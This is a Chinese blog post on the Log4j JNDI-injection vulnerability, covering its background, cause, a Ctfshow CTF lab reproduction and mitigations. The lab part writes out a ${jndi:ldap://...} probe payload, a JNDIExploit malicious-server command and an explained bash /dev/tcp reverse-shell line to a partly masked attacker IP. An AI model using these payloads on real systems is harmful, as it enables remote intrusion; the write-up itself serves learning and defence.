<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>log4j漏洞原理和靶场复现 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="log4j漏洞原理和靶场复现" />
<meta property="og:description" content="目录
前言
一、Log4j的前置知识
1，JNDI接口
2，LDAP协议
3，RMI协议 4,Log4j
二、Log4j漏洞的成因
三、Ctfshow靶场复现
四、Log4j的临时缓解措施
前言 提示：这里可以添加本文要记录的大概内容：
Log4j作为核弹级别的漏洞，影响十分广泛，作为刚入门网络安全的小白，之前对Java的知识很不熟悉，最近接触了一点关于SpringBoot2的微服务开发，对Java有了些许了解。因此，了解了一下Log4j漏洞，做个小小的总结。
提示：以下是本篇文章正文内容，下面案例可供参考
一、Log4j的前置知识 1，JNDI接口 解释：JNDI全称为 Java Naming and Directory Interface，是JAVA命名和目录接口的一种JAVA API，应用通过该接口与具体的目录服务进行交互，允许通过名称发现和查找数据或对象，可用于动态加载配置等。
2，LDAP协议 解释：LDAP称为轻量级目录访问协议，既是一种服务，也是一种协议，是JNDI的一种底层实现，主要功能是提供命名关键字到对象的映射目录，开发人员可以通过输入名称，获取到对象的内容。简单来说，就是搜索功能，它是分布式的，允许从远程服务器上面加载获取对象。
3，RMI协议 解释：JAVA的一种远程接口调用协议，在TCP协议上传递可序列化的Java对象，即可以实现调用远程方法和调用本地方法一样简单。
4,Log4j 解释:Log4j是由Apache提供的日志操作包，用于帮助用户处理日志信息。通过Log4j，可以控制日志信息输送的目的地是控制台、文件、GUI组件、甚至是套接口服务器等各种地方。
二、Log4j漏洞的成因 Log4j为了输出日志时能输出任意位置的Java对象，引入了Lookup接口，这个Lookup接口可以看作是JNDI的一种实现，允许按照具体的名称逻辑查找对象的位置，并输出对象的内容，此对象可以通过Java的序列化或反序列化传输，从远程服务器上查找。
由于Lookup接口的原因，Log4j就暗含JNDI注入漏洞，可以联合使用JNDI&#43;LDAP或者JNDI&#43;RMI通过命名功能直接从远程服务器上调用文件并在本地执行。
Log4j在处理消息转换时，会按照字符检测每条日志，当日志中包含${}时，则会将表达式的内容替换成真实的内容(即lookup接口查找得到的内容），使用LDAP或RMI协议，能从远程服务区上请求恶意的对象，对象在调用的过程中会被解析执行，导致了Log4j的漏洞。
三、Ctfshow靶场复现 1，进入靶场
先使用dnslog 域名解析探测是否存在Log4j漏洞，${jndi:ldap://dns}，通过ldap协议进行域名解析，被记录则存在漏洞。
2，在远程vps上搭建LDAP服务器，并将恶意代码编译并挂在服务器上，对JAVA不太熟练，直接使用JNDIExploit工具进行搭建。
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 12x.7x.2x.17x -p 4444 启用恶意服务
通过bash -i &gt;&amp; /dev/tcp/120.x.7x.2x.17x/5555 0&gt;&amp;1反弹shell
bash -i 指开启一个交互式的Shell
&amp;符号用于区分文件和文件描述符
&gt;&amp;表示标准输出或标准错误输出重定向到文件
0指标准输入重定向，1指标准输出重定向，2指错误输出重定向
/dev/tcp指linux下的特殊设备，可用于建立Socket连接
bash -i &gt;&amp; /dev/tcp/120.x.7x.2x.17x/5555 0&gt;&amp;1 指将标准输出重定向到/dev/tcp/ip/port端口文件中即重定向到攻击机，靶机的标准输入被重定向到了标准输出，标准输出重定向到了攻击机，因此标准输入也就重定向到了攻击机，所以可以看到攻击机输入命令并看到结果。
3，使用nc工具监听端口，接受反弹shell
BASE64编码后&#43;和=进行一次URL编码才能被工具识别 得到flag(工具的payload有很多，可耐心多尝试几个，由于JDK版本等原因，可能一些不行）
注：若是云服务器，切记配置安全组规则，开启端口出入方向的访问，否则跟我一样傻呆呆。
原理：通过Lookup接口&#43;LADP，从服务器请求下载了存在恶意payload的class文件，由于日志检测时，存在${则触发替换机制，导致了表达式被替换成了lookup查找到的恶意payload，在请求过程中被实例化解析执行了。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/46aa31afebba1485af73307d716d43ed/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-08-19T11:26:59+08:00" />
<meta property="article:modified_time" content="2022-08-19T11:26:59+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">log4j漏洞原理和靶场复现</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="%E5%89%8D%E8%A8%80-toc" style="margin-left:0px;"><a href="#%E5%89%8D%E8%A8%80" rel="nofollow">前言</a></p> 
<p id="%E4%B8%80%E3%80%81Log4j%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-toc" style="margin-left:0px;"><a href="#%E4%B8%80%E3%80%81Log4j%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86" rel="nofollow">一、Log4j的前置知识</a></p> 
<p id="1%EF%BC%8CJNDI%E6%8E%A5%E5%8F%A3-toc" style="margin-left:0px;"><a href="#1%EF%BC%8CJNDI%E6%8E%A5%E5%8F%A3" rel="nofollow">1，JNDI接口</a></p> 
<p id="2%EF%BC%8CLDAP%E5%8D%8F%E8%AE%AE-toc" style="margin-left:40px;"><a href="#2%EF%BC%8CLDAP%E5%8D%8F%E8%AE%AE" rel="nofollow">2，LDAP协议</a></p> 
<p id="3%EF%BC%8CRMI%E5%8D%8F%E8%AE%AE%C2%A0-toc" style="margin-left:40px;"><a href="#3%EF%BC%8CRMI%E5%8D%8F%E8%AE%AE%C2%A0" rel="nofollow">3，RMI协议 </a></p> 
<p id="4%2CLog4j-toc" style="margin-left:40px;"><a href="#4%2CLog4j" rel="nofollow">4,Log4j</a></p> 
<p id="%E4%BA%8C%E3%80%81Log4j%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%88%90%E5%9B%A0-toc" style="margin-left:0px;"><a href="#%E4%BA%8C%E3%80%81Log4j%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%88%90%E5%9B%A0" rel="nofollow">二、Log4j漏洞的成因</a></p> 
<p id="%E4%B8%89%E3%80%81Ctfshow%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-toc" style="margin-left:0px;"><a href="#%E4%B8%89%E3%80%81Ctfshow%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0" rel="nofollow">三、Ctfshow靶场复现</a></p> 
<p id="%E5%9B%9B%E3%80%81Log4j%E7%9A%84%E4%B8%B4%E6%97%B6%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD-toc" style="margin-left:0px;"><a href="#%E5%9B%9B%E3%80%81Log4j%E7%9A%84%E4%B8%B4%E6%97%B6%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD" rel="nofollow">四、Log4j的临时缓解措施</a></p> 
<p></p> 
<hr> 
<h2 id="%E5%89%8D%E8%A8%80"><a id="_7"></a>前言</h2> 
<p><code>提示：这里可以添加本文要记录的大概内容：</code></p> 
<p>Log4j作为核弹级别的漏洞，影响十分广泛，作为刚入门网络安全的小白，之前对Java的知识很不熟悉，最近接触了一点关于SpringBoot2的微服务开发，对Java有了些许了解。因此，了解了一下Log4j漏洞，做个小小的总结。</p> 
<hr> 
<p><code>提示：以下是本篇文章正文内容，下面案例可供参考</code></p> 
<h2 id="%E4%B8%80%E3%80%81Log4j%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><a id="pandas_16"></a>一、Log4j的前置知识</h2> 
<h2 id="1%EF%BC%8CJNDI%E6%8E%A5%E5%8F%A3">1，JNDI接口</h2> 
<p>解释：JNDI全称为 <strong>Java Naming and Directory Interface，</strong>是JAVA命名和目录接口的一种JAVA API，应用通过该接口与具体的目录服务进行交互，允许通过名称发现和查找数据或对象，可用于动态加载配置等。</p> 
<h3 id="2%EF%BC%8CLDAP%E5%8D%8F%E8%AE%AE">2，LDAP协议</h3> 
<p>解释：LDAP称为轻量级目录访问协议，既是一种服务，也是一种协议，是JNDI的一种底层实现，主要功能是提供命名关键字到对象的映射目录，开发人员可以通过输入名称，获取到对象的内容。简单来说，就是搜索功能，它是分布式的，允许从远程服务器上面加载获取对象。</p> 
<h3 id="3%EF%BC%8CRMI%E5%8D%8F%E8%AE%AE%C2%A0">3，RMI协议 </h3> 
<p>解释：JAVA的一种远程接口调用协议，在TCP协议上传递可序列化的Java对象，即可以实现调用远程方法和调用本地方法一样简单。</p> 
<h3 id="4%2CLog4j">4,Log4j</h3> 
<p>解释:Log4j是由Apache提供的日志操作包，用于帮助用户处理日志信息。通过Log4j，可以控制日志信息输送的目的地是控制台、文件、GUI组件、甚至是套接口服务器等各种地方。</p> 
<h2 id="%E4%BA%8C%E3%80%81Log4j%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%88%90%E5%9B%A0">二、Log4j漏洞的成因</h2> 
<p>Log4j为了输出日志时能输出任意位置的Java对象，引入了Lookup接口，这个Lookup接口可以看作是JNDI的一种实现，允许按照具体的名称逻辑查找对象的位置，并输出对象的内容，此对象可以通过Java的序列化或反序列化传输，从远程服务器上查找。</p> 
<p>由于Lookup接口的原因，Log4j就暗含JNDI注入漏洞，可以联合使用JNDI+LDAP或者JNDI+RMI通过命名功能直接从远程服务器上调用文件并在本地执行。</p> 
<p>Log4j在处理消息转换时，会按照字符检测每条日志，当日志中包含${}时，则会将表达式的内容替换成真实的内容(即lookup接口查找得到的内容），使用LDAP或RMI协议，能从远程服务区上请求恶意的对象，对象在调用的过程中会被解析执行，导致了Log4j的漏洞。</p> 
<h2 id="%E4%B8%89%E3%80%81Ctfshow%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0">三、Ctfshow靶场复现</h2> 
<p>1，进入靶场</p> 
<p><img alt="" height="990" src="https://images2.imgbox.com/56/07/5aB7KgsV_o.png" width="1200"></p> 
<blockquote> 
 <p>先使用dnslog 域名解析探测是否存在Log4j漏洞，${jndi:ldap://dns}，通过ldap协议进行域名解析，被记录则存在漏洞。</p> 
</blockquote> 
<p></p> 
<p><img alt="" height="566" src="https://images2.imgbox.com/28/23/7DW69YSH_o.png" width="1200"></p> 
<p> 2，在远程vps上搭建LDAP服务器，并将恶意代码编译并挂在服务器上，对JAVA不太熟练，直接使用JNDIExploit工具进行搭建。</p> 
<blockquote> 
 <p>java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 12x.7x.2x.17x -p 4444 启用恶意服务</p> 
</blockquote> 
<p> 通过bash -i &gt;&amp; /dev/tcp/120.x.7x.2x.17x/5555 0&gt;&amp;1反弹shell</p> 
<blockquote> 
 <p>bash -i 指开启一个交互式的Shell</p> 
 <p>&amp;符号用于区分文件和文件描述符</p> 
 <p>&gt;&amp;表示标准输出或标准错误输出重定向到文件</p> 
 <p>0指标准输入重定向，1指标准输出重定向，2指错误输出重定向</p> 
 <p>/dev/tcp指linux下的特殊设备，可用于建立Socket连接</p> 
 <p>bash -i &gt;&amp; /dev/tcp/120.x.7x.2x.17x/5555 0&gt;&amp;1 指将标准输出重定向到/dev/tcp/ip/port端口文件中即重定向到攻击机，靶机的标准输入被重定向到了标准输出，标准输出重定向到了攻击机，因此标准输入也就重定向到了攻击机，所以可以看到攻击机输入命令并看到结果。</p> 
</blockquote> 
<p>3，使用nc工具监听端口，接受反弹shell</p> 
<p><img alt="" height="1031" src="https://images2.imgbox.com/2b/97/zHRgdzsF_o.png" width="1200"></p> 
<blockquote> 
 <p>BASE64编码后+和=进行一次URL编码才能被工具识别 </p> 
</blockquote> 
<p><img alt="" height="634" src="https://images2.imgbox.com/64/9d/tjNoVttP_o.png" width="1200"></p> 
<p><img alt="" height="640" src="https://images2.imgbox.com/05/5a/htpOaopO_o.png" width="900"> 得到flag(工具的payload有很多，可耐心多尝试几个，由于JDK版本等原因，可能一些不行）</p> 
<blockquote> 
 <p>注：若是云服务器，切记配置安全组规则，开启端口出入方向的访问，否则跟我一样傻呆呆。</p> 
</blockquote> 
<p> 原理：通过Lookup接口+LADP，从服务器请求下载了存在恶意payload的class文件，由于日志检测时，存在${则触发替换机制，导致了表达式被替换成了lookup查找到的恶意payload，在请求过程中被实例化解析执行了。</p> 
<h2 id="%E5%9B%9B%E3%80%81Log4j%E7%9A%84%E4%B8%B4%E6%97%B6%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD">四、Log4j的临时缓解措施</h2> 
<p>关闭Lookup功能：</p> 
<p>（1）设置log4j2.formatMsgNoLookups=True</p> 
<p>（2）Dlog4j2.formatMsgNoLookups=true。</p> 
<p>（3）设置系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS为true</p> 
<p>（4）采用防火墙对请求流量中的${jndi进行拦截，防止JNDI注入。</p> 
<p>（5）禁止存在漏洞的业务访问外网，主动外连外网。<br>  </p> 
<hr> 
<p> <strong>总结</strong></p> 
<p>Log4j漏洞影响的组件十分之多，触发漏洞的条件低，却能够执行任意的代码，危害十分的高。本来方便开发使用的组件，由于替换的bug酿成大祸。由于JAVA只懂一些，也是没法进行具体的源码分析，路还长，怀着耐心慢慢走。</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/0ef62361d2003278c573ec0a0c459850/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">文件的导入与导出</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/b829702e0ef4e99eb2a5272e76812c49/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Android7.1隐藏底部导航栏</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>